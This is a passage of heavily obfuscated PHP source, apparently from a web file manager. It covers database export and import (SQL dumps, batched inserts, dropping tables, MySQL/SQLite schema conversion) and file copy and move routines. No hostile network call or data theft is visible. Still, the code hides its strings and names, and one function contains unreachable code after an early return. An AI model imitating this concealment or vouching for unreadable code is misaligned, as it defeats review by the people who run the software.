$´°¥Ò‡È[$_SERVER[«òÑğ][87]] = "\x7b\151\157\x3a{$ÒŸš…Ìä}\175" . substr($´°¥Ò‡È[$_SERVER[«òÑğ][87]], strlen("\x7b\151\157\72{$´°¥Ò‡È[$_SERVER[«òÑğ][907]]}\175")); $´°¥Ò‡È[$_SERVER[«òÑğ][907]] = $ÒŸš…Ìä; } $¢ğŒ°¢ë[] = $_SERVER[«òÑğ][1160] . $this->sqlEncode($´°¥Ò‡È) . $_SERVER[«òÑğ][1161]; } $Ò‹†…Óú = "\x49\x4e\123\x45\122\124\40\111\x4e\124\x4f\x20\x60{$öÌòÖÄ—}\x60\x20\50\x60" . implode($_SERVER[«òÑğ][1162], $•½‰¸æé) . $_SERVER[«òÑğ][1163]; fwrite($ïèõŠ‚Ã, $Ò‹†…Óú . implode($_SERVER[«òÑğ][1164], $¢ğŒ°¢ë) . $_SERVER[«òÑğ][74] . PHP_EOL); $˜‚ôŸÁû += $€·áá»­; if ($×ë¢ÈÅü) { $×ë¢ÈÅü->update($€·áá»­); } } while ($ìûı¬Í— == $€·áá»­); fclose($ïèõŠ‚Ã); return $˜‚ôŸÁû; } public function sqlToDb($Ø˜É­ì€, &$Ï­×ˆ¿ó) { $‰ôÇíöÌ =& $_SERVER[«òÑğ]; $»ıŒÉÒ¼ = $this->model()->db(); $Âã¦ƒó– = @fopen($Ø˜É­ì€, $‰ôÇíöÌ[1165]); if (!$Âã¦ƒó–) { return !1; } $Ğ¾—ç = 0; $¥Áº´” = $‰ôÇíöÌ[12]; $·„“ÆŠ– = array(); $¹¶í©ÔŞ = $this->dbType(); $ìÊíİ„ = $¹¶í©ÔŞ == $‰ôÇíöÌ[13] ? 500 : 2000; $ĞÏãâî = basename($Ø˜É­ì€, $‰ôÇíöÌ[874]); $´†ó¸‡ = 0; $Œ Ö‘¯§ = 4194304; while (!feof($Âã¦ƒó–)) { $¹—ÓÑ“„ = trim(fgets($Âã¦ƒó–)); if (!$¹—ÓÑ“„) { continue; } $´àÏ–Âé = $this->sqlDecode($¹—ÓÑ“„, $¹¶í©ÔŞ, $ĞÏãâî); if (stripos($´àÏ–Âé, $‰ôÇíöÌ[433]) === 0) { if (!$¥Áº´”) { $¥Áº´” = $´àÏ–Âé . $‰ôÇíöÌ[53]; } continue; } if ($Ï­×ˆ¿ó) { $Ï­×ˆ¿ó->task[$‰ôÇíöÌ[1150]] += 1; } $Ğ¾—ç++; $·„“ÆŠ–[] = rtrim(rtrim(trim($´àÏ–Âé), $‰ôÇíöÌ[50]), $‰ôÇíöÌ[74]); $±¦€ßµ = null; $·Ë™•¾Ø = strlen($´àÏ–Âé); $´†ó¸‡ += $·Ë™•¾Ø; $ª›ˆËà’ = strlen($¥Áº´”) + $´†ó¸‡ + (count($·„“ÆŠ–) - 1); if ($ª›ˆËà’ >= $Œ Ö‘¯§) { $±¦€ßµ = array_pop($·„“ÆŠ–); if ($Ğ¾—ç > 1) { $Ğ¾—ç--; } } if ($Ğ¾—ç >= $ìÊíİ„ || $±¦€ßµ) { $´àÏ–Âé = $¥Áº´” . implode($‰ôÇíöÌ[50], $·„“ÆŠ–); if (!$»ıŒÉÒ¼->execute($´àÏ–Âé)) { return !1; } if ($Ï­×ˆ¿ó) { $Ï­×ˆ¿ó->update($Ğ¾—ç); } $·„“ÆŠ– = array(); $Ğ¾—ç = 0; $´†ó¸‡ = 0; if ($±¦€ßµ) { $·„“ÆŠ– = array($±¦€ßµ); $Ğ¾—ç = 1; $´†ó¸‡ = $·Ë™•¾Ø; } } } fclose($Âã¦ƒó–); if (!empty($·„“ÆŠ–)) { $´àÏ–Âé = $¥Áº´” . implode($‰ôÇíöÌ[50], $·„“ÆŠ–); if (!$»ıŒÉÒ¼->execute($´àÏ–Âé)) { return !1; } if ($Ï­×ˆ¿ó) { $Ï­×ˆ¿ó->update($Ğ¾—ç); } } return !0; } public function dropTable($Ú¹°‚â = null) { $¥†ø’áá = $this->model()->db(); $âôşãÖÂ = $Ú¹°‚â ? array($Ú¹°‚â) : $¥†ø’áá->getTables(); if (!$âôşãÖÂ) { return; } foreach ($âôşãÖÂ as $Ú¹°‚â) { if ($Ú¹°‚â) { $Ú¹°‚â = strtolower($Ú¹°‚â); } else { continue; } $¥†ø’áá->execute("\x64\162\x6f\x70\x20\164\x61\142\154\145\40\x69\146\x20\x65\170\151\x73\164\x73\40\x60{$Ú¹°‚â}\140"); } } private function sqlEncode($í°Ğ‹Î“) { $ğ†ÉÇ¥Ÿ =& $_SERVER[«òÑğ]; $öü—‚“¾ = array(); foreach ($í°Ğ‹Î“ as $ÑÍ€ºüñ) { if (is_array($ÑÍ€ºüñ)) { $ÑÍ€ºüñ = json_encode_force($ÑÍ€ºüñ); } $ÑÍ€ºüñ = addslashes($ÑÍ€ºüñ); $ÑÍ€ºüñ = str_replace(array($ğ†ÉÇ¥Ÿ[1166], $ğ†ÉÇ¥Ÿ[288], $ğ†ÉÇ¥Ÿ[420]), array($ğ†ÉÇ¥Ÿ[1167], $ğ†ÉÇ¥Ÿ[1168], $ğ†ÉÇ¥Ÿ[1169]), $ÑÍ€ºüñ); $öü—‚“¾[] = $ÑÍ€ºüñ; } return $ğ†ÉÇ¥Ÿ[58] . implode($ğ†ÉÇ¥Ÿ[1170], $öü—‚“¾) . $ğ†ÉÇ¥Ÿ[58]; } private function sqlDecode($Ëœâú°º, $”æñŞá, $¤úğšş = '') { $ãÃ…Í² =& $_SERVER[«òÑğ]; $Ëœâú°º = str_replace(array($ãÃ…Í²[1167], $ãÃ…Í²[1168], $ãÃ…Í²[1169]), array($ãÃ…Í²[1166], $ãÃ…Í²[288], $ãÃ…Í²[420]), $Ëœâú°º); if ($”æñŞá == $ãÃ…Í²[13]) { $Ëœâú°º = str_ireplace($ãÃ…Í²[1171], $ãÃ…Í²[59], $Ëœâú°º); $Ëœâú°º = stripslashes($Ëœâú°º); } return preg_replace($ãÃ…Í²[1172], $ãÃ…Í²[12], $Ëœâú°º); if ($”æñŞá == $ãÃ…Í²[13]) { return $¤úğšş != $ãÃ…Í²[868] ? stripslashes($Ëœâú°º) : $Ëœâú°º; } if ($¤úğšş == $ãÃ…Í²[868]) { $Ëœâú°º = str_replace($ãÃ…Í²[1173], $ãÃ…Í²[121], stripslashes($Ëœâú°º)); } return $Ëœâú°º; } public function getSqlFile($¤í»à×º = '') { $Ã½¨ïï‹ =& $_SERVER[«òÑğ]; $¤­ì¬¤ = $this->dbType(!0); $ÃÂÆÅ™” = CONTROLLER_DIR . "\151\156\163\x74\x61\154\154\57\144\141\x74\141\57{$¤­ì¬¤}\56\163\x71\154"; $õÒú¾ô™ = file_get_contents($ÃÂÆÅ™”); $íÌÑÖÅò = $Ã½¨ïï‹[1174] . ($¤­ì¬¤ == $Ã½¨ïï‹[892] ? $Ã½¨ïï‹[1175] : $Ã½¨ïï‹[1176]) . $Ã½¨ïï‹[1177]; preg_match_all($íÌÑÖÅò, $õÒú¾ô™, $ñì”íí); $õÛ¼úú˜ = $ñì”íí[1]; $§ãêï£ = $this->model()->db(); $Æ÷üøÅÇ = $§ãêï£->getTables(); $Ùì¼Ü = TEMP_FILES . $Ã½¨ïï‹[1178] . date($Ã½¨ïï‹[262]) . $Ã½¨ïï‹[8]; del_dir($Ùì¼Ü); mk_dir($Ùì¼Ü); $¦›Äåæ = $Ùì¼Ü . $Ã½¨ïï‹[1179]; $¦‘›˜é¶ = $Ùì¼Ü . $Ã½¨ïï‹[1180]; $±¨øæñƒ = $¤­ì¬¤ == $Ã½¨ïï‹[13] ? $Ã½¨ïï‹[892] : $Ã½¨ïï‹[13]; IO::copy(CONTROLLER_DIR . "\x69\156\163\164\x61\x6c\154\x2f\144\141\x74\x61\x2f{$±¨øæñƒ}\x2e\x73\161\154", $Ùì¼Ü); @touch($Ùì¼Ü . $¤­ì¬¤ . $Ã½¨ïï‹[874]); $èÖûş´º = fopen($¦›Äåæ, $Ã½¨ïï‹[1154]); $ˆ®è÷˜ª = fopen($¦‘›˜é¶, $Ã½¨ïï‹[1154]); if ($¤­ì¬¤ == $Ã½¨ïï‹[13]) { $Æ÷üøÅÇ = array_diff($Æ÷üøÅÇ, array($Ã½¨ïï‹[866], $Ã½¨ïï‹[867])); $û¢£³» = array($Ã½¨ïï‹[1181], $Ã½¨ïï‹[1182], $Ã½¨ïï‹[1183]); fwrite($ˆ®è÷˜ª, implode(PHP_EOL, $û¢£³») . PHP_EOL . PHP_EOL); foreach ($Æ÷üøÅÇ as $ŞäÀ­æ) { $µŸš™Ó½ = $this->sqlFromSqlite($ŞäÀ­æ); if (!$µŸš™Ó½[$Ã½¨ïï‹[13]]) { continue; } fwrite($ˆ®è÷˜ª, $µŸš™Ó½[$Ã½¨ïï‹[13]] . PHP_EOL . PHP_EOL); if (!in_array($ŞäÀ­æ, $õÛ¼úú˜)) { fwrite($èÖûş´º, $µŸš™Ó½[$Ã½¨ïï‹[892]] . PHP_EOL . PHP_EOL); } } } else { foreach ($Æ÷üøÅÇ as $ŞäÀ­æ) { $µŸš™Ó½ = $this->sqlFromMysql($ŞäÀ­æ); if (!$µŸš™Ó½[$Ã½¨ïï‹[892]]) { continue; } fwrite($èÖûş´º, $µŸš™Ó½[$Ã½¨ïï‹[892]] . PHP_EOL . PHP_EOL); if (!in_array($ŞäÀ­æ, $õÛ¼úú˜)) { fwrite($ˆ®è÷˜ª, $µŸš™Ó½[$Ã½¨ïï‹[13]] . PHP_EOL . PHP_EOL); } } } fclose($èÖûş´º); fclose($ˆ®è÷˜ª); $õÒú¾ô™ = array($Ã½¨ïï‹[892] => $¦›Äåæ, $Ã½¨ïï‹[13] => $¦‘›˜é¶); return $¤í»à×º ? $õÒú¾ô™[$¤í»à×º] : $õÒú¾ô™; } public function dbType($•¾µ˜É´ = false) { $ÎØ¯¿ş¨ =& $_SERVER[«òÑğ]; $ù¸ØÊ£» = $•¾µ˜É´ ? $GLOBALS[$ÎØ¯¿ş¨[6]][$ÎØ¯¿ş¨[21]] : $this->database; $ù¸ØÊ£» = array_change_key_case($ù¸ØÊ£»); $É”è¶Ñ = $ù¸ØÊ£»[$ÎØ¯¿ş¨[1054]]; if ($É”è¶Ñ == $ÎØ¯¿ş¨[1051]) { $æåÓÃŸİ = explode($ÎØ¯¿ş¨[4], $ù¸ØÊ£»[$ÎØ¯¿ş¨[1060]]); $É”è¶Ñ = $æåÓÃŸİ[0]; } $Ï´Æªª‰ = array($ÎØ¯¿ş¨[1184] => $ÎØ¯¿ş¨[13], $ÎØ¯¿ş¨[999] => $ÎØ¯¿ş¨[892]); if (isset($Ï´Æªª‰[$É”è¶Ñ])) { $É”è¶Ñ = $Ï´Æªª‰[$É”è¶Ñ]; } return $É”è¶Ñ; } public function sqlFromMysql($˜‘Çäêî, $á¶¡éª = '') { $àÀà˜Ô =& $_SERVER[«òÑğ]; $¢¬š¬üÍ = $this->model()->db(); $øªéú¬È = $¢¬š¬üÍ->query($àÀà˜Ô[1185] . $˜‘Çäêî . $àÀà˜Ô[464]); if (!$øªéú¬È || !$øªéú¬È[0]) { return !1; } $Óœ­•”Ä = _get($øªéú¬È[0], $àÀà˜Ô[1186], $àÀà˜Ô[12]); if (!$Óœ­•”Ä) { return !1; } $ô—áûÑ = "\x44\122\117\120\x20\x54\x41\102\114\x45\x20\x49\x46\x20\105\130\111\123\124\x53\40\140{$˜‘Çäêî}\140\x3b" . PHP_EOL . $Óœ­•”Ä . $àÀà˜Ô[74]; if ($á¶¡éª && $á¶¡éª == $àÀà˜Ô[892]) { return $ô—áûÑ; } $º²Ï¶š = array_change_key_case($GLOBALS[$àÀà˜Ô[6]][$àÀà˜Ô[21]]); $ÌßßèÒ† = $º²Ï¶š[$àÀà˜Ô[1059]]; $»ÛûÉìÆ = $àÀà˜Ô[1187] . $ÌßßèÒ† . $àÀà˜Ô[1188] . $˜‘Çäêî . $àÀà˜Ô[58]; $ãœ‡ß´ = $àÀà˜Ô[1189] . $˜‘Çäêî . $àÀà˜Ô[987]; $¶öÈüµÇ = $¢¬š¬üÍ->query($»ÛûÉìÆ); if (empty($¶öÈüµÇ)) { $–Šù™ƒò = array($àÀà˜Ô[892] => $àÀà˜Ô[12], $àÀà˜Ô[13] => $àÀà˜Ô[12]); return $á¶¡éª ? $–Šù™ƒò[$á¶¡éª] : $–Šù™ƒò; } $»Ÿäæ” = $¢¬š¬üÍ->query($ãœ‡ß´); $±Î…¢ê° = $àÀà˜Ô[12]; $¥ƒÂª = array(); foreach ($»Ÿäæ” as $Áô«»ó’) { if (!$±Î…¢ê° && $Áô«»ó’[$àÀà˜Ô[1190]] == $àÀà˜Ô[1191]) { $±Î…¢ê° = $Áô«»ó’[$àÀà˜Ô[1192]]; } if (isset($¥ƒÂª[$Áô«»ó’[$àÀà˜Ô[1190]]])) { $¥ƒÂª[$Áô«»ó’[$àÀà˜Ô[1190]]][$àÀà˜Ô[1193]][] = $Áô«»ó’[$àÀà˜Ô[1192]]; continue; } $¥ƒÂª[$Áô«»ó’[$àÀà˜Ô[1190]]] = array($àÀà˜Ô[1194] => $Áô«»ó’[$àÀà˜Ô[1190]], $àÀà˜Ô[1193] => array($Áô«»ó’[$àÀà˜Ô[1192]]), $àÀà˜Ô[1195] => $Áô«»ó’[$àÀà˜Ô[1196]] == $àÀà˜Ô[91] ? 0 : 1); } $ºÈèáæ = array(); foreach ($¥ƒÂª as $Áô«»ó’) { $È’÷İÑ¡ = $Áô«»ó’[$àÀà˜Ô[1194]] == $àÀà˜Ô[1191]; $É±ä«ß = array($àÀà˜Ô[1197], $Áô«»ó’[$àÀà˜Ô[1195]] == $àÀà˜Ô[91] && !$È’÷İÑ¡ ? $àÀà˜Ô[1198] : $àÀà˜Ô[12], $àÀà˜Ô[1199], $àÀà˜Ô[1200] . $˜‘Çäêî . $àÀà˜Ô[11] . ($È’÷İÑ¡ ? $àÀà˜Ô[1201] : $Áô«»ó’[$àÀà˜Ô[1194]]) . $àÀà˜Ô[121], $àÀà˜Ô[1202], $àÀà˜Ô[121] . $˜‘Çäêî . $àÀà˜Ô[121], $àÀà˜Ô[1203] . implode($àÀà˜Ô[1204], $Áô«»ó’[$àÀà˜Ô[1193]]) . $àÀà˜Ô[1205]); $ºÈèáæ[] = implode($àÀà˜Ô[53], $É±ä«ß) . $àÀà˜Ô[74]; } $Ù‘§é¦ƒ = array(); $·ÀÔË = array($àÀà˜Ô[1206] => $àÀà˜Ô[1207], $àÀà˜Ô[1207] => $àÀà˜Ô[1207], $àÀà˜Ô[366] => $àÀà˜Ô[393], $àÀà˜Ô[365] => $àÀà˜Ô[393]); foreach ($¶öÈüµÇ as $Áô«»ó’) { $É±ä«ß = array($àÀà˜Ô[121] . $Áô«»ó’[$àÀà˜Ô[1208]] . $àÀà˜Ô[121], isset($·ÀÔË[$Áô«»ó’[$àÀà˜Ô[1209]]]) ? $·ÀÔË[$Áô«»ó’[$àÀà˜Ô[1209]]] : $Áô«»ó’[$àÀà˜Ô[1210]], $Áô«»ó’[$àÀà˜Ô[1211]] == $àÀà˜Ô[985] ? $àÀà˜Ô[1212] : $àÀà˜Ô[1213], $Áô«»ó’[$àÀà˜Ô[1208]] == $±Î…¢ê° ? $àÀà˜Ô[1214] : $àÀà˜Ô[12], $Áô«»ó’[$àÀà˜Ô[1036]] ? strtoupper(str_replace($àÀà˜Ô[11], $àÀà˜Ô[12], $Áô«»ó’[$àÀà˜Ô[1036]])) : $àÀà˜Ô[12]); $Ù‘§é¦ƒ[] = trim(implode($àÀà˜Ô[53], $É±ä«ß)); } $¿•‚ê™ì = array($àÀà˜Ô[1215] . $˜‘Çäêî . $àÀà˜Ô[1216], $àÀà˜Ô[1217] . $˜‘Çäêî . $àÀà˜Ô[1218], implode($àÀà˜Ô[50] . PHP_EOL, $Ù‘§é¦ƒ), $àÀà˜Ô[1033]); $Ò°Êãùš = implode(PHP_EOL, array_merge($¿•‚ê™ì, $ºÈèáæ)); if ($á¶¡éª && $á¶¡éª == $àÀà˜Ô[13]) { return $Ò°Êãùš; } $–Šù™ƒò = array($àÀà˜Ô[892] => $ô—áûÑ, $àÀà˜Ô[13] => $Ò°Êãùš); return $á¶¡éª ? $–Šù™ƒò[$á¶¡éª] : $–Šù™ƒò; } public function sqlFromSqlite($ì¨í°´ê, $õËœª‘– = '') { $’ò£ëèò =& $_SERVER[«òÑğ]; $ä­‹£”Š = $this->model()->db(); $Æäô™å« = "\120\122\101\107\x4d\101\40\x54\101\102\114\x45\137\x49\x4e\106\x4f\40\x28\47{$ì¨í°´ê}\x27\51"; $Ä¹ÌìÓ = "\x53\105\114\105\103\124\x20\52\40\x46\122\117\x4d\x20\163\161\x6c\x69\x74\145\x5f\155\x61\163\x74\x65\x72\40\x57\x48\105\122\105\40\x74\x62\154\137\x6e\x61\x6d\145\40\75\40\x27{$ì¨í°´ê}\x27"; $Â¢ °Á¢ = $ä­‹£”Š->query($Æäô™å«); if (empty($Â¢ °Á¢)) { $ßû«Ó÷å = array($’ò£ëèò[892] => $’ò£ëèò[12], $’ò£ëèò[13] => $’ò£ëèò[12]); return $õËœª‘– ? $ßû«Ó÷å[$õËœª‘–] : $ßû«Ó÷å; } $’“Â¦Ò¿ = $ä­‹£”Š->query($Ä¹ÌìÓ); $Ï¥ôáà– = $£Èˆ‰Áˆ = array(); foreach ($’“Â¦Ò¿ as $°…Îåæ¬) { if ($°…Îåæ¬[$’ò£ëèò[33]] == $’ò£ëèò[359]) { $Ï¥ôáà–[] = $°…Îåæ¬[$’ò£ëèò[1219]]; } else { $£Èˆ‰Áˆ[$°…Îåæ¬[$’ò£ëèò[32]]] = $°…Îåæ¬[$’ò£ëèò[1219]]; } } $ƒì¨şÙà = array_merge(array($’ò£ëèò[1215] . $ì¨í°´ê . $’ò£ëèò[121]), $Ï¥ôáà–, array_values($£Èˆ‰Áˆ)); $ƒì¨şÙà = implode($’ò£ëèò[74] . PHP_EOL, $ƒì¨şÙà) . $’ò£ëèò[74]; if ($õËœª‘– && $õËœª‘– == $’ò£ëèò[13]) { return $ƒì¨şÙà; } $Ôİ‚Èµ = array(); foreach ($£Èˆ‰Áˆ as $úà–şÖµ => $üç£æ˜Á) { $ÈÅÄÂºØ = str_replace($’ò£ëèò[1220] . $ì¨í°´ê . $’ò£ëèò[11], $’ò£ëèò[12], $úà–şÖµ); $ÈÅÄÂºØ = str_replace($ì¨í°´ê . $’ò£ëèò[11], $’ò£ëèò[12], $úà–şÖµ); $€ŒüÉö = str_replace(array($’ò£ëèò[121], $’ò£ëèò[1044]), $’ò£ëèò[464], substr($üç£æ˜Á, stripos($üç£æ˜Á, $’ò£ëèò[340]))); $Ôİ‚Èµ[$ÈÅÄÂºØ] = $€ŒüÉö; } $„©õû¬€ = array(); $ªıöî²ü = array($’ò£ëèò[1207] => $’ò£ëèò[1221], $’ò£ëèò[393] => $’ò£ëèò[1222]); $ƒ³½À³€ = $è­§åË† = $’ò£ëèò[12]; foreach ($Â¢ °Á¢ as $°…Îåæ¬) { if ($°…Îåæ¬[$’ò£ëèò[57]] == $’ò£ëèò[91]) { $ƒ³½À³€ = $°…Îåæ¬[$’ò£ëèò[32]]; } $ÉÊÆíø = $°…Îåæ¬[$’ò£ëèò[33]]; if ($ÉÊÆíø == $’ò£ëèò[1223] && isset($Ôİ‚Èµ[$°…Îåæ¬[$’ò£ëèò[32]]])) { $ÉÊÆíø = $’ò£ëèò[1224]; } $‘ºŸğ¦É = array($’ò£ëèò[464] . $°…Îåæ¬[$’ò£ëèò[32]] . $’ò£ëèò[464], _get($ªıöî²ü, $ÉÊÆíø, $ÉÊÆíø), $°…Îåæ¬[$’ò£ëèò[35]] == $’ò£ëèò[91] ? $’ò£ëèò[1212] : $’ò£ëèò[1225] . $°…Îåæ¬[$’ò£ëèò[56]], $°…Îåæ¬[$’ò£ëèò[57]] == $’ò£ëèò[91] ? $’ò£ëèò[1226] : $’ò£ëèò[12]); $„©õû¬€[] = trim(implode($’ò£ëèò[53], $‘ºŸğ¦É)); } foreach ($Ôİ‚Èµ as $ÈÅÄÂºØ => $€ŒüÉö) { if ($ÈÅÄÂºØ == $’ò£ëèò[1201]) { $Í§á‘ªü = $è­§åË† = $’ò£ëèò[1227] . $ƒ³½À³€ . $’ò£ëèò[1228]; } else { $Í§á‘ªü = (stripos($ÈÅÄÂºØ, $’ò£ëèò[11]) ? $’ò£ëèò[1229] : $’ò£ëèò[12]) . ($’ò£ëèò[1230] . $ÈÅÄÂºØ . $’ò£ëèò[1231] . $€ŒüÉö); } $„©õû¬€[] = $Í§á‘ªü; } if ($ƒ³½À³€ && !$è­§åË†) { $„©õû¬€ = array_merge(array($’ò£ëèò[1227] . $ƒ³½À³€ . $’ò£ëèò[1228]), $„©õû¬€); } $½†ÀÖ¥ = array($’ò£ëèò[1232] . $ì¨í°´ê . $’ò£ëèò[1233], $’ò£ëèò[1234] . $ì¨í°´ê . $’ò£ëèò[1235], implode($’ò£ëèò[50] . PHP_EOL, $„©õû¬€), $’ò£ëèò[1236]); $êÓš·ùæ = implode(PHP_EOL, $½†ÀÖ¥); if ($õËœª‘– && $õËœª‘– == $’ò£ëèò[892]) { return $êÓš·ùæ; } $ßû«Ó÷å = array($’ò£ëèò[892] => $êÓš·ùæ, $’ò£ëèò[13] => $ƒì¨şÙà); return $õËœª‘– ? $ßû«Ó÷å[$õËœª‘–] : $ßû«Ó÷å; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($‰Íâ‡û®, $‰çÍĞÏ) { $ÂÑº•­ =& $_SERVER[«òÑğ]; $ú¬âÃµ™ = $‰çÍĞÏ; $GLOBALS[$ÂÑº•­[1237]] = $ÂÑº•­[1238] . $‰Íâ‡û®; Hook::trigger($ÂÑº•­[1238] . $‰Íâ‡û® . $ÂÑº•­[1239], $ú¬âÃµ™); $³ë‰ÓÅ’ = self::driverMake($‰çÍĞÏ[0]); if (!$³ë‰ÓÅ’) { return !1; } if (method_exists($³ë‰ÓÅ’, $‰Íâ‡û®)) { $—‡ëõô¨ = @call_user_func_array(array($³ë‰ÓÅ’, $‰Íâ‡û®), $‰çÍĞÏ); } else { if (method_exists($³ë‰ÓÅ’, $ÂÑº•­[1240])) { $—‡ëõô¨ = @call_user_func_array(array($³ë‰ÓÅ’, $‰Íâ‡û®), $‰çÍĞÏ); } else { if (method_exists(self, $‰Íâ‡û®)) { $—‡ëõô¨ = @call_user_func_array(array(self, $‰Íâ‡û®), $‰çÍĞÏ); } else { $—‡ëõô¨ = call_user_func_array(array(parent, $‰Íâ‡û®), $‰çÍĞÏ); } } } Hook::trigger($ÂÑº•­[1238] . $‰Íâ‡û® . $ÂÑº•­[1241], $ú¬âÃµ™, $—‡ëõô¨); return $—‡ëõô¨; } public static function init($ÒÕ×ù“û) { return self::driverMake($ÒÕ×ù“û); } public static function copy($“ü´õ™ú, $¢ÀÏˆ ¦, $ûÂ—¸Ëæ = false, $É‘„©³‰ = false) { return self::copyMoveStart($“ü´õ™ú, $¢ÀÏˆ ¦, $ûÂ—¸Ëæ, $_SERVER[«òÑğ][626], $É‘„©³‰); } public static function move($ˆ¦í­ŠÜ, $…°Ö‘û¥, $ÃÀÉÔŠ = false, $ç£ôœ¼¡ = false) { return self::copyMoveStart($ˆ¦í­ŠÜ, $…°Ö‘û¥, $ÃÀÉÔŠ, $_SERVER[«òÑğ][628], $ç£ôœ¼¡); } public static function copyMoveChildren($å”ÔŠè°, $œ¡ ·÷à, $‚Æ´² = "\x63\157\x70\x79", $†ªÅù°¼ = REPEAT_REPLACE) { $°ÖÒãè“ =& $_SERVER[«òÑğ]; $»ØÖ½òç = $å”ÔŠè°; $šêâ£ö¤ = self::driverMake($å”ÔŠè°); $‡Ä†ÎÚ = $šêâ£ö¤->listPath($å”ÔŠè°, !0); $Õå‹¼Öç = array_merge($‡Ä†ÎÚ[$°ÖÒãè“[86]], $‡Ä†ÎÚ[$°ÖÒãè“[85]]); foreach ($Õå‹¼Öç as $¼·…ïğ³) { self::copyMoveStart($¼·…ïğ³[$°ÖÒãè“[87]], $œ¡ ·÷à, $†ªÅù°¼, $‚Æ´², !1); } if ($‚Æ´² == $°ÖÒãè“[628]) { self::remove($»ØÖ½òç); } } private static function copyMoveStart($¬è¿Ç±®, $£–‚Ò²„, $äµÔĞó, $”Ä²ÈÊ, $ÊèµÖ×) { $õŠ¸öÊ¶ =& $_SERVER[«òÑğ]; $áÎÈ¿Ò = array($¬è¿Ç±®, $£–‚Ò²„, $äµÔĞó, $ÊèµÖ×); Hook::trigger($õŠ¸öÊ¶[1238] . $”Ä²ÈÊ . $õŠ¸öÊ¶[1239], $áÎÈ¿Ò); $”–Ë¨Âª = self::copyMove($¬è¿Ç±®, $£–‚Ò²„, $äµÔĞó, $”Ä²ÈÊ, $ÊèµÖ×); Hook::trigger($õŠ¸öÊ¶[1238] . $”Ä²ÈÊ . $õŠ¸öÊ¶[1241], $áÎÈ¿Ò, $”–Ë¨Âª); return $”–Ë¨Âª; } public static function saveFile($ğåéÏñµ, $ªà¤âÉ“, $ô˜–Ü…Æ = true) { $æ‹ä’û¾ =& $_SERVER[«òÑğ]; $¨ÇŸ™ÍÕ = self::info($ªà¤âÉ“); $¶ÄÏğŸ• = self::driverMake($ğåéÏñµ); $ ³İÖÊ = self::driverMake($ªà¤âÉ“); $®¿Û¡ö¸ = !1; if ($ ³İÖÊ->pathParse[$æ‹ä’û¾[1242]]) { $®¿Û¡ö¸ = $ ³İÖÊ; $Îº¾¸ªŒ = $ ³İÖÊ->pathParse[$æ‹ä’û¾[1242]]; $ ³İÖÊ = self::driverMake($Îº¾¸ªŒ); } if ($¶ÄÏğŸ•->pathParse[$æ‹ä’û¾[1242]]) { $ø¥İ¨Òò = $¶ÄÏğŸ•->pathParse[$æ‹ä’û¾[1242]]; $¶ÄÏğŸ• = self::driverMake($ø¥İ¨Òò); } $ï†î÷íÎ = $ ³İÖÊ->pathFather($ªà¤âÉ“); $ò·¤å’Û = !0; if (!$ô˜–Ü…Æ && self::driverIsSame($¶ÄÏğŸ•, $ ³İÖÊ)) { $ò·¤å’Û = !1; } $ÓÅòà¡® = self::copyFile($¶ÄÏğŸ•, $ğåéÏñµ, $ ³İÖÊ, $ï†î÷íÎ, $¨ÇŸ™ÍÕ[$æ‹ä’û¾[32]], $ò·¤å’Û); if ($®¿Û¡ö¸) { $ÓÅòà¡® = $®¿Û¡ö¸->getPathOuter($ÓÅòà¡®); } return $ÓÅòà¡®; } private static function copyMove($ªÎÔíÖ, $„’¶ÅˆÓ, $èíï¶, $Õ—¤†İâ, $ãÈ–³ĞÇ = false) { $‰–â¥ŸÁ =& $_SERVER[«òÑğ]; if (!$ªÎÔíÖ || $ªÎÔíÖ == $‰–â¥ŸÁ[8] || !$„’¶ÅˆÓ) { return !1; } ignore_timeout(); $é¼»˜µ = self::driverMake($ªÎÔíÖ); $œî°¥ = self::driverMake($„’¶ÅˆÓ); $âèŠèš = $Õ—¤†İâ == $‰–â¥ŸÁ[628]; $ÑÕ”ÛÃÅ = !1; if ($œî°¥->pathParse[$‰–â¥ŸÁ[1242]]) { $ÑÕ”ÛÃÅ = $œî°¥; $„’¶ÅˆÓ = $œî°¥->pathParse[$‰–â¥ŸÁ[1242]]; $œî°¥ = self::driverMake($„’¶ÅˆÓ); } if ($é¼»˜µ->pathParse[$‰–â¥ŸÁ[1242]]) { $ªÎÔíÖ = $é¼»˜µ->pathParse[$‰–â¥ŸÁ[1242]]; $é¼»˜µ = self::driverMake($ªÎÔíÖ); } self::check($é¼»˜µ, $ªÎÔíÖ, $œî°¥, $„’¶ÅˆÓ); Hook::trigger($‰–â¥ŸÁ[1243], $é¼»˜µ, $ªÎÔíÖ, $œî°¥, $„’¶ÅˆÓ); $’úê¡Ù§ = self::driverIsSame($é¼»˜µ, $œî°¥); if ($’úê¡Ù§) { if ($Õ—¤†İâ == $‰–â¥ŸÁ[628] && !method_exists($œî°¥, $‰–â¥ŸÁ[1244]) && trim($„’¶ÅˆÓ, $‰–â¥ŸÁ[8]) == trim($œî°¥->pathFather($ªÎÔíÖ), $‰–â¥ŸÁ[8])) { if ($é¼»˜µ->pathThis($ªÎÔíÖ) != $ãÈ–³ĞÇ && !$é¼»˜µ->isOsDriver()) { return $é¼»˜µ->rename($ªÎÔíÖ, $ãÈ–³ĞÇ); } return $œî°¥->getPathOuter($ªÎÔíÖ); } if (method_exists($œî°¥, $Õ—¤†İâ)) { return $œî°¥->{$Õ—¤†İâ}($ªÎÔíÖ, $„’¶ÅˆÓ, $èíï¶, $ãÈ–³ĞÇ); } } if ($’úê¡Ù§ && $Õ—¤†İâ == $‰–â¥ŸÁ[628] && $œî°¥->getType() == $‰–â¥ŸÁ[109]) { $ßÉâ†¢ä = $œî°¥->movePath($ªÎÔíÖ, $„’¶ÅˆÓ, $ãÈ–³ĞÇ); if ($ßÉâ†¢ä) { return $ßÉâ†¢ä; } } $¾ÈÉá› = $é¼»˜µ->isFile($ªÎÔíÖ); if (!$¾ÈÉá› && $œî°¥->getType() == $‰–â¥ŸÁ[841] && $é¼»˜µ->getType() == $‰–â¥ŸÁ[109]) { $ßÉâ†¢ä = $œî°¥->copyFolderFromIO($é¼»˜µ, $ªÎÔíÖ, $„’¶ÅˆÓ, $èíï¶, $âèŠèš, $ãÈ–³ĞÇ); } else { $ßÉâ†¢ä = self::copyPath($é¼»˜µ, $ªÎÔíÖ, $œî°¥, $„’¶ÅˆÓ, $èíï¶, $âèŠèš, $¾ÈÉá›, $ãÈ–³ĞÇ); } if ($ßÉâ†¢ä && $âèŠèš) { $é¼»˜µ->remove($ªÎÔíÖ); } if ($ÑÕ”ÛÃÅ) { 